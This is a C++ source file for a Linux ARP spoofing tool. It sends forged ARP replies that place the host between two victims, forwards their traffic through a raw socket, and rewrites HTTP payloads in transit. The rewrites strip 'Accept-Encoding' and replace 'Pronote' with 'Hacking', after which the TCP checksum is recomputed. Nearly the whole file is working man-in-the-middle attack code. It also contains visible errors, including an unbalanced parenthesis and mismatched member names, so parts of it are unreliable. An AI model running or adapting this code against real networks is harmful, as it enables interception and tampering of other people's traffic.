#include "arpspoofer.h"
#include "Sniffer.h"
#include "memoryutil.h"
#include <iostream>
#include <fstream>

ArpSpoofer::ArpSpoofer()
{
}

ArpSpoofer::~ArpSpoofer()
{
#ifdef __linux__
    ::close(_socket_arp);
#endif
}

void    ArpSpoofer::Initialize()
{
    // Initialize ARP socket
    int                  one = 1;
    const int            *val = &one;

    _socket_arp = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
    setsockopt(_socket_arp, IPPROTO_IP, IP_HDRINCL, (char *) val, sizeof(one));
}

void     ArpSpoofer::Start(const std::string &local_ip, char *local_mac, const std::string &ip1, char *mac1, const std::string &ip2, char *mac2)
{
    _local_mac = local_mac;
    _local_ip = local_ip;

    client_t    *client = new client_t;
    client->ip = ip1;
    std::memcpy(client->mac, mac1, 6);
    _client1 = client;

    client = new client_t;
    client->ip = ip2;
    std::memcpy(client->mac, mac2, 6);
    _client2 = client;
}

void     ArpSpoofer::Stop()
{
    delete _client1;
    _client1 = NULL;
    delete _client2;
    _client2 = NULL;
}

void     ArpSpoofer::ManageNewPacket(SniffedPacket &packet)
{
#ifdef __linux__
    if (_client1 == NULL || _client2 == NULL || !packet.has_ether_hdr)
        return;

    eth_hdr_t *eth = (eth_hdr_t *) packet.data;
    if (strncmp(eth->ether_dhost, _local_mac, 6))
        return;

    if (packet.ip_dest == _local_ip || packet.ip_source == _local_ip || !(strncmp(eth->ether_shost, _client1->mac, 6) || strncmp(eth->ether_shost, _client2->mac, 6)))
        return ;

    int nb_bytes_added = 0;
    //nb_bytes_added += replaceTCPText(packet, "img src=", "img src=\"http://upload.wikimedia.org/wikipedia/fr/f/fb/C-dans-l'air.png\" "); // 65
    nb_bytes_added += ReplaceTCPText(packet, "Accept-Encoding:", "Accept-Rubbish!:");
    nb_bytes_added += ReplaceTCPText(packet, "Pronote", "Hacking");
    qDebug("Replaced %d bytes", nb_bytes_added;

    IP_HDR  *ip_hdr = (IP_HDR *) (packet.data + ETHER_HDR_SIZE);
    struct sockaddr_in   sin;
    sin.sin_family = AF_INET;
    sin.sin_port = 0;
    sin.sin_addr.s_addr = ip_hdr->ip_destaddr;

    sendto(_socket_arp, packet.data + ETHER_HDR_SIZE, packet.size - ETHER_HDR_SIZE, 0, (struct sockaddr *)&sin, sizeof(sin));
#endif
}

void     ArpSpoofer::SendArpRedirectRequest()
{
#ifdef __linux__
    if (client1 == NULL || client2 == NULL || !this->sniffer->IsSniffing())
        return;

    int                 sock;
    char                packet[PKTLEN];
    struct ether_header *eth = (struct ether_header *) packet;
    struct ether_arp    *arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
    struct sockaddr_ll  device;

    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0)
        qDebug() << "fail socket";

    client_t    *client = client1;
    for (int i = 0; i < 2; ++i)
    {
        // To
        sscanf((client == client1 ? client2->ip : client1->ip).c_str(), "%d.%d.%d.%d", (int *) &arp->arp_spa[0],
                                       (int *) &arp->arp_spa[1],
                                       (int *) &arp->arp_spa[2],
                                       (int *) &arp->arp_spa[3]);
        // From
        std::memcpy(arp->arp_tha, client->mac, 6);
        // By
        std::memcpy(arp->arp_sha, _mac, 6);

        memcpy(eth->ether_dhost, arp->arp_tha, ETH_ALEN);
        memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);
        eth->ether_type = htons(ETH_P_ARP);

        arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
        arp->ea_hdr.ar_pro = htons(ETH_P_IP);
        arp->ea_hdr.ar_hln = ETH_ALEN;
        arp->ea_hdr.ar_pln = IP4LEN;
        arp->ea_hdr.ar_op = htons(ARPOP_REPLY);

        memset(&device, 0, sizeof(device));
        device.sll_ifindex = if_nametoindex(this->interface.c_str());
        device.sll_family = AF_PACKET;
        memcpy(device.sll_addr, arp->arp_sha, ETH_ALEN);
        device.sll_halen = htons(ETH_ALEN);

        sendto(sock, packet, PKTLEN, 0, (struct sockaddr *) &device, sizeof(device));
        client = client2;
    }

    ::close(sock);
#endif
}


int    ArpSpoofer::ReplaceTCPText(SniffedPacket &packet, const std::string &find, const std::string &replace)
{
    if (!(packet.protocol == "TCP" && (packet.sport == 80 || packet.dport == 80)))
        return 0;

    std::vector<std::size_t>    indexes;
    char                        *found;
    char                        *buffer = packet.data;
    while ((found = (char *) memmem(buffer, packet.size - (buffer - packet.data), find.c_str(), find.length())) != NULL)
    {
        indexes.push_back(found - packet.data);
        buffer = found + find.length();
    }

    if (!indexes.size())
        return 0;

    DumpHex(packet.data, packet.size);

    int     nb_bytes_added = replace.length() * indexes.size() - find.length() * indexes.size();
    int     new_size = packet.size + nb_bytes_added;
    char    *data = new char[new_size * 2];
    std::memmove(data, packet.data, packet.size);
    delete packet.data;
    packet.size = new_size;
    packet.data = data;

    for (std::size_t i = 0; i < indexes.size(); ++i)
    {
        std::memmove(&data[indexes[i] + replace.length()], &data[indexes[i] + find.length()], packet.size - indexes[i] - find.length());
        std::memcpy(&data[indexes[i]], replace.c_str(), replace.length());
    }

    // Modify TCP Checksum
    IP_HDR      *iphdr = (IP_HDR *) (packet.data + ETHER_HDR_SIZE);
    TCP_HDR     *tcphdr = (TCP_HDR *) ((char *) iphdr + packet.iphdr_size);
    uint32_t    sum = 0;
    uint16_t    padding = 0;
    uint16_t    proto_tcp = 6;
    uint16_t    w16;
    char        *datasum = (char *) tcphdr;
    int         size_tcp_segment = packet.size - packet.iphdr_size - ETHER_HDR_SIZE;
    uint16_t    old_checksum = tcphdr->checksum;
    tcphdr->checksum = 0;

    if (size_tcp_segment & 1)
    {
        padding = 1;
        datasum[size_tcp_segment] = 0;
    }
    for (int i = 0; i < size_tcp_segment + padding; i = i + 2)
    {
        w16 = ((datasum[i] << 8) & 0xFF00) + (datasum[i + 1] & 0xFF);
        sum += (unsigned long) (w16);
    }
    for (int i = 0; i < 4; i = i + 2)
    {
        w16 = ((((char *) &iphdr->ip_srcaddr)[i] << 8) & 0xFF00) + (((char *) &iphdr->ip_srcaddr)[i + 1] & 0xFF);
        sum += (w16);
        w16 = ((((char *) &iphdr->ip_destaddr)[i] << 8) & 0xFF00) + (((char *) &iphdr->ip_destaddr)[i + 1] & 0xFF);
        sum += (w16);
    }

    sum += (proto_tcp) + (size_tcp_segment);
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);
    sum = ~sum;

    qDebug("Dumping");
    DumpHex(packet.data, packet.size);
    qDebug("TcpCheck %04x -> %04x == %04x", old_checksum, htons(sum), (unsigned short) sum);
    tcphdr->checksum = htons(sum);
    iphdr->ip_total_length = size_tcp_segment + packet.iphdr_size;
    qDebug("Size packet: %d // Ip total: %d", packet.size, iphdr->ip_total_length);

    return nb_bytes_added;
}
